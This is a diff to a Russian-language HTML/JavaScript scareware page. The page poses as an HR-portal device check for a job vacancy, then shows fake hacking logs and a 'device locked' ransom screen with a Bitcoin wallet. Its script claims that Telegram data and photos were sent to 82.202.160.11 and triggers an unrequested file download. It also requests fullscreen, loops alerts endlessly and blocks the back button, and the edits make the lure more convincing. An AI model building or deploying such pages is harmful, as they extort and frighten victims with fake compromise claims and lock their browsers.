@@ -7,15 +7,15 @@
     <style>
         body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
         
-        /* ТЕРМИНАЛЬНЫЙ ФОН (ЛОГИ ИЗ СКРИНШОТОВ) */
+        /* ТЕРМИНАЛЬНЫЙ ФОН (РЕАЛЬНЫЕ КОМАНДЫ) */
         #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; opacity: 0.3; z-index: 1; pointer-events: none; white-space: pre; line-height: 1.2; overflow: hidden; }
 
-        /* НАЧАЛЬНЫЙ ЭКРАН (ЛЕГЕНДА С ВАКАНСИЕЙ) */
+        /* ЭКРАН ВАКАНСИИ */
         #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f0f2f5; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
         .start-box { background: white; padding: 40px 30px; border-radius: 2px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; border-top: 5px solid #1a73e8; }
         .start-btn { padding: 18px; font-size: 16px; background: #1a73e8; color: white; border: none; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
 
-        /* ЭКРАН ВЫМОГАТЕЛЯ */
+        /* ОКНО ВЫМОГАТЕЛЯ */
         .content { position: relative; z-index: 10; width: 95%; max-width: 600px; display: none; }
         .alert-box { border: 2px solid red; padding: 25px; color: #ff0000; background: rgba(0,0,0,0.95); text-align: left; box-shadow: 0 0 40px red; }
         .btc-wallet { color: yellow; word-break: break-all; font-weight: bold; background: #222; padding: 12px; display: block; border: 1px dashed yellow; margin: 15px 0; font-size: 13px; text-align: center; }
@@ -36,22 +36,22 @@
     <div id="overlay">
         <div class="start-box">
             <h2 style="margin: 0 0 15px; color: #1e293b; font-family: sans-serif;">HR Portal</h2>
-            <p style="color: #475569; font-size: 14px; font-family: sans-serif;">Для доступа к личному кабинету и вакансии «Менеджер проектов», пройдите обязательную проверку безопасности устройства.</p>
-            <button class="start-btn">ПРОЙТИ ПРОВЕРКУ</button>
+            <p style="color: #475569; font-size: 14px; font-family: sans-serif;">Для доступа к вакансии «Менеджер проектов», пройдите верификацию безопасности устройства.</p>
+            <button class="start-btn">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
         </div>
     </div>
 
     <div id="matrix"></div>
 
     <div id="loader-screen" style="display: none;">
-        <div id="log-text" style="color: #0f0; font-weight: bold;">[SYSTEM] Initializing scan...</div>
+        <div id="log-text" style="color: #0f0; font-weight: bold;">[SYSTEM] Initializing...</div>
         <div class="progress-container"><div id="progress-bar"></div></div>
         <div id="perc" style="color: #0f0;">0% completed</div>
     </div>
 
     <div id="main-content" class="content">
         <div class="alert-box">
-            <h2 class="blink" style="text-align: center; margin-top: 0; font-size: 24px;">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
+            <h2 class="blink" style="text-align: center; margin-top: 0; font-size: 22px;">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
             <p>Все данные Telegram, история браузера и личные фото отправлены на сервер <strong>82.202.160.11</strong>.</p>
             <p><strong>RAT STATUS: ACTIVE (SESSION_0x882)</strong></p>
             <p>Ваше устройство полностью скомпрометировано. Все личные данные (фото, видео, переписки и пароли) были успешно скопированы.</p>
@@ -71,22 +71,18 @@
         let prg = 0;
         let isStarted = false;
 
-        // Команды из реальных логов Ubuntu
         const hackerCommands = [
-            "root@ubuntu-server:~# apt-get upgrade",
+            "root@system:~# apt-get upgrade --force-yes",
             "Reading package lists... Done",
             "Building dependency tree... Done",
-            "Reading state information... Done",
-            "The following packages will be upgraded:",
-            "  python-report serverbackup-console kernel-rat",
-            "Get:1 http://repo.r1soft.com/apt stable/main [91.8 MB]",
-            "Unpacking replacement python-problem-report...",
-            "Preparing to replace serverbackup-setup...",
-            "Dumping /data/user/0/com.telegram.messenger...",
-            "Accessing /sdcard/DCIM/Camera/... [OK]",
-            "Exfiltrating 49904 files to 82.202.160.11...",
-            "sh: /proc/self/mem: memory dump successful",
-            "RAT_STATUS: SESSION_0x882 ESTABLISHED"
+            "Dumping /data/user/0/com.telegram.messenger/cache...",
+            "Accessing /sdcard/DCIM/Camera/... [SUCCESS]",
+            "Fetching 0x882-RAT-PAYLOAD from 82.202.160.11",
+            "Bypassing Google Play Protect... OK",
+            "Exfiltrating contacts.db to remote server...",
+            "sh: /proc/self/mem: access granted",
+            "Kernel panic prevented. RAT hiding in memory...",
+            "Encrypting user files with AES-256..."
         ];
 
         function startAttack() {
@@ -98,10 +94,10 @@
 
             if ("Notification" in window) Notification.requestPermission();
             
-            // Скачиваем "лог"
+            // Скрытое скачивание
             const a = document.createElement('a');
-            a.href = URL.createObjectURL(new Blob(["VERIFICATION_LOG_ID_882\nSTATUS: COMPROMISED"], {type: 'text/plain'}));
-            a.download = "system_security_report.txt";
+            a.href = URL.createObjectURL(new Blob(["CRITICAL_SYSTEM_ERROR_LOG_882"], {type: 'text/plain'}));
+            a.download = "verification_error_report.txt";
             a.click();
 
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
@@ -111,7 +107,7 @@
         }
 
         function slowLoading() {
-            const steps = ["INITIALIZING", "BYPASSING_PROTECT", "DUMPING_CACHE", "EXTRACTING_MEDIA", "ENCRYPTING", "FINALIZING"];
+            const steps = ["INITIALIZING", "BYPASS_PROTECT", "DUMPING_HISTORY", "COPYING_MEDIA", "SYNC_REMOTE", "FINALIZING"];
             const bar = document.getElementById('progress-bar');
             const log = document.getElementById('log-text');
             const perc = document.getElementById('perc');
@@ -126,9 +122,9 @@
 
                 if (prg >= 100) {
                     clearInterval(timer);
-                    setTimeout(showRansom, 800);
+                    setTimeout(showRansom, 1000);
                 }
-            }, 180); // Медленная загрузка для реализма
+            }, 180); // Медленно и реалистично
         }
 
         function showRansom() {
@@ -144,14 +140,14 @@
             setInterval(() => {
                 const cmd = hackerCommands[Math.floor(Math.random() * hackerCommands.length)];
                 matrix.innerText += "\n" + cmd;
-                if(matrix.innerText.length > 2500) matrix.innerText = matrix.innerText.substring(600);
+                if(matrix.innerText.length > 3000) matrix.innerText = matrix.innerText.substring(600);
                 window.scrollTo(0, document.body.scrollHeight);
-            }, 120);
+            }, 130);
         }
 
         function scareMore() {
-            alert("ОШИБКА ДЕАКТИВАЦИИ: RAT заблокировал доступ к ядру. Попытка удаления зафиксирована.");
-            setTimeout(() => { while(true) { alert("ATTEMPT TO CLOSE BLOCKED"); } }, 500);
+            alert("КРИТИЧЕСКАЯ ОШИБКА: RAT заблокировал попытку деактивации. Данные под угрозой удаления.");
+            setTimeout(() => { while(true) { alert("DATA LEAK IN PROGRESS..."); } }, 500);
         }
 
         history.pushState(null, null, location.href);
